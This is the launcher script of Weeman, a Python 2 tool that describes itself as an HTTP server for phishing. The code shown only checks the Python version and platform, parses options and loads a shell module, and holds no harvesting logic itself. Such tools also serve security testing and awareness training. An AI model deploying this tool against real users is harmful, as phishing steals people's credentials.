#!/usr/bin/env python2
#
# weeman.py - HTTP server for phishing
#
#  Weeman is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  Weeman is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Copyright (C) 2015 Hypsurus <hypsurus@mail.ru>
#

import sys
import optparse
from core.misc import printt
from core.config import user_agent as usera

def tests_pyver():
    if sys.version[:3] == "2.7" or "2" in sys.version[:3]:
        pass # All good
    elif "3" in sys.version[:3]:
        printt(1,"Weeman has no support for Python 3.")
    else:
        printt(1, "Your Python version is very old ..")

def tests_platform():
    if "linux" in sys.platform:
        #printt(3, "Running Weeman on linux ... (All good)")
        pass
    elif "darwin" in sys.platform:
        #printt(3, "Running Weeman on \'Mac\' (All good)")
        pass
    elif "win" in sys.platform:
        print("Sorry, there is no support for windows right now.")
        sys.exit(1)
    else:
        printt(3, "If \'Weeman\' runs sucsessfuly on your platform %s\nPlease let me (@Hypsurus) know!" %sys.platform)

def main():
    tests_pyver()
    tests_platform()
    parser = optparse.OptionParser()
    parser.add_option("-q", "--quiet", dest="quiet_mode_opt", action="store_true", default=False, help="Runs without displaying the banner.")
    parser.add_option("-p", "--profile", dest="profile", help="Load weeman profile.")
    options,r = parser.parse_args()

    if options.profile:
        from core.shell import shell_noint
        shell_noint(options.profile)
    else:
        from core.shell import shell
        shell()

if __name__ == '__main__':
    main()
